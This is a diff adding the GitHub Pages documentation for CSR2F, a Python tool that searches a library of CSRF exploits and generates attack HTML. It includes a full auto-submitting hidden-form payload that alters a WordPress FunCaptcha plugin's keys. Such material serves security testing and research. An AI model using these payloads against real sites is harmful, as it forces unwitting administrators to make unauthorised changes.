@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset='utf-8' />
+    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+    <meta name="description" content="Csr2f : CSR2F is a Python tool used for generating CSRF (Cross-Site Request Forgery) exploits" />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
+
+    <title>Csr2f</title>
+  </head>
+
+  <body>
+
+    <!-- HEADER -->
+    <div id="header_wrap" class="outer">
+        <header class="inner">
+          <a id="forkme_banner" href="https://github.com/ncrocfer/csr2f">View on GitHub</a>
+
+          <h1 id="project_title">Csr2f</h1>
+          <h2 id="project_tagline">CSR2F is a Python tool used for generating CSRF (Cross-Site Request Forgery) exploits</h2>
+
+            <section id="downloads">
+              <a class="zip_download_link" href="https://github.com/ncrocfer/csr2f/zipball/master">Download this project as a .zip file</a>
+              <a class="tar_download_link" href="https://github.com/ncrocfer/csr2f/tarball/master">Download this project as a tar.gz file</a>
+            </section>
+        </header>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="main_content_wrap" class="outer">
+      <section id="main_content" class="inner">
+        <h1>
+<a name="csr2f" class="anchor" href="#csr2f"><span class="octicon octicon-link"></span></a>CSR2F</h1>
+
+<p>CSR2F (Cross-Site Request Forgery Framework) is an open source tool written in Python and used for generating CSRF (Cross-Site Request Forgery) exploits.
+It allows you to search an exploit for a specific case (for example a vulnerable WordPress plugin), then to configure and generate the HTML code.</p>
+
+<h2>
+<a name="prerequisites" class="anchor" href="#prerequisites"><span class="octicon octicon-link"></span></a>Prerequisites</h2>
+
+<ul>
+<li>CSR2F uses <a href="http://www.python.org/download/">Python 3</a> to run.</li>
+</ul><h2>
+<a name="installation" class="anchor" href="#installation"><span class="octicon octicon-link"></span></a>Installation</h2>
+
+<p>You can download the latest tarball by clicking <a href="https://github.com/ncrocfer/csr2f/tarball/master">here</a> or latest zipball by clicking <a href="https://github.com/ncrocfer/csr2f/zipball/master">here</a>.</p>
+
+<p>Preferably, you can download CSR2F by cloning the <a href="https://github.com/ncrocfer/csr2f">Git</a> repository:</p>
+
+<pre><code>git clone https://github.com/ncrocfer/csr2f.git
+</code></pre>
+
+<h2>
+<a name="usage" class="anchor" href="#usage"><span class="octicon octicon-link"></span></a>Usage</h2>
+
+<p>You must execute the <code>csr2f.py</code> file to start CSR2F and obtain a prompt:</p>
+
+<pre><code>shatter@shatter:~/csr2f$ python3 csr2f.py
+
+*********************************************************
+*                                                       *
+*     ______   ______   _______      _____   ________   *
+*   .' ___  |.' ____ \ |_   __ \    / ___ `.|_   __  |  *
+*  / .'   \_|| (___ \_|  | |__) |  |_/___) |  | |_ \_|  *
+*  | |        _.____`.   |  __ /    .'____.'  |  _|     *
+*  \ `.___.'\| \____) | _| |  \ \_ / /_____  _| |_      *
+*   `.____ .' \______.'|____| |___||_______||_____|     *
+*                                                       *
+*         Cross Site Request Forgery Framework          *
+*                                                       *
+* Version  : 0.1b                                       *
+* Author   : Nicolas Crocfer                            *
+* Website  : http://csr2f.github.com                    *
+* Licence  : GPLv3                                      *
+*                                                       *
+*********************************************************
+
+[+] 207 exploits loaded
+
+csr2f&gt; 
+</code></pre>
+
+<p><strong>help</strong></p>
+
+<p>This command describes the other commands and shows their usage.</p>
+
+<pre><code>csr2f&gt; help
+
+Commands    Description
+========    ===========
+
+config      Display the configuration options
+clear       Clear the current screen
+search      Search an exploit based on keyword
+show        Display informations about an exploit based on its ID
+set         Set special fields for an exploit
+generate    Generate the exploit to the console or in a file
+...         ...
+
+csr2f&gt; help config
+
+This command is used to view and modify the basic configuration. You
+can view it by typing 'config' without argument.
+
+Usage:  config &lt;item&gt; &lt;value&gt;
+Ex: config host_url http://www.example.com
+
+csr2f&gt;
+</code></pre>
+
+<p><strong>config</strong></p>
+
+<p>This command is used to view and modify the basic configuration.</p>
+
+<pre><code>csr2f&gt; config
+
+    Config          Value
+    ======          =====
+
+    host_url        http://www.example.com
+    redirect        False
+    html_skeleton   True
+    html_title      CSR2F : Cross Site Request Forgery Framework
+    redirect_url    http://www.example.com
+
+csr2f&gt; config redirect True
+[+] The value has been modified
+csr2f&gt;
+</code></pre>
+
+<p><strong>search</strong></p>
+
+<p>You can search an exploit based on keywords by using the <code>search</code> command.</p>
+
+<pre><code>csr2f&gt; search wordpress plugin
+
+ID      Method     Name                           Description
+==      ======     ====                           ===========
+
+112     POST       Wordpress FunCaptcha plug...   A CSRF vulnerability allows to disable...
+134     POST       Wordpress Mathjax Latex P...   There is no CSRF protection on the mat...
+175     POST       WordPress SolveMedia 1.1.0     SolveMedia is a capatcha service that ...
+...     ...        ...                            ...
+
+csr2f&gt;
+</code></pre>
+
+<p><strong>show</strong></p>
+
+<p>This command is used to show the informations about an exploit (author, description, configuration...). </p>
+
+<pre><code>csr2f&gt; show 112
+
+Informations
+============
+
+    Name : Wordpress FunCaptcha plugin 0.3.2
+    ----
+
+    Description
+    -----------
+    A CSRF vulnerability allows to disable the plugin by submitting an invalid private or public key.
+
+    Author : Nicolas Crocfer (http://www.shatter.fr)
+    ------
+
+    Method &amp; Path : (POST) /wp-admin/plugins.php?page=funcaptcha/wp_funcaptcha.php
+    -------------
+
+Configuration
+=============
+
+    funcaptcha[public_key] =&gt; foo
+    ----------------------
+    Value of the new public key
+
+    funcaptcha[private_key] =&gt; bar
+    -----------------------
+    Value of the new private key
+
+csr2f&gt;
+</code></pre>
+
+<p><strong>set</strong></p>
+
+<p>Each exploit can contain special fields that you can edit (for example a username, a password, an email adress...). This command is used to change these values.</p>
+
+<pre><code>csr2f&gt; set 112 funcaptcha[public_key] 1234
+[+] The value has been modified
+csr2f&gt;
+</code></pre>
+
+<p><strong>generate</strong></p>
+
+<p>This command is used to generate the HTML exploit. You can display it on the screen by typing <code>generate &lt;id&gt;</code> without other argument. You can also pass a filename to create a new file.</p>
+
+<pre><code>csr2f&gt; generate 112
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+      &lt;meta charset="utf-8"/&gt;
+      &lt;title&gt;
+          CSR2F : Cross Site Request Forgery Framework
+      &lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;form action="http://www.example.com/wp-admin/plugins.php?page=funcaptcha/wp_funcaptcha.php" id="csr2f" method="post"&gt;
+      &lt;input name="funcaptcha[public_key]" type="hidden" value="foo"/&gt;
+      &lt;input name="funcaptcha[private_key]" type="hidden" value="bar"/&gt;
+      &lt;input name="funcaptcha[action]" type="hidden" value="settings"/&gt;
+      &lt;input name="funcaptcha[type]" type="hidden" value="Settings"/&gt;
+    &lt;/form&gt;
+    &lt;script type="text/javascript"&gt;
+      document.getElementById("csr2f").submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+csrf2&gt; generate 112 index.html
+[+] The file was created in 'output' folder
+csrf2&gt;
+</code></pre>
+
+<p><strong>Other commands</strong></p>
+
+<ul>
+<li>
+<code>clear</code> : Clear the user screen</li>
+<li>
+<code>update</code> : Update the exploits list (this feature is not yet present in the beta version)</li>
+<li>
+<code>exit</code> : Exit the console</li>
+</ul><h2>
+<a name="creating-a-new-exploit" class="anchor" href="#creating-a-new-exploit"><span class="octicon octicon-link"></span></a>Creating a new exploit</h2>
+
+<p>For the time being, CSR2F does not include a lot of exploits. I am currently incorporating the ones already online on <a href="http://www.exploit-db.com/search/?action=search&amp;filter_description=csrf">exploit-db.com</a>.</p>
+
+<p>But the goal of this framework is to be the reference for CSRF vulnerabilities : so I encourage you to integrate your exploit to this tool when you discover a new vulnerability, and thereby increase the list with your contributions.</p>
+
+<p>CSR2F uses a simple template for integrating new exploits. Each exploit is located in the <code>exploits</code> folder. For the moment this tool is still in Beta version, so I am waiting the return of beta testers to see if I need to add or modify the template system and then update this documentation. Anyway you can view the existing templates and tell me what do you think about.</p>
+
+<h2>
+<a name="oh-one-last-thing" class="anchor" href="#oh-one-last-thing"><span class="octicon octicon-link"></span></a>Oh, one last thing</h2>
+
+<p>I'm a French developer, my English is not perfect and I thank you in advance to tell me my mistakes :)</p>
+      </section>
+    </div>
+
+    <!-- FOOTER  -->
+    <div id="footer_wrap" class="outer">
+      <footer class="inner">
+        <p class="copyright">Csr2f maintained by <a href="https://github.com/ncrocfer">ncrocfer</a></p>
+        <p>Published with <a href="http://pages.github.com">GitHub Pages</a></p>
+      </footer>
+    </div>
+
+    
+
+  </body>
+</html>
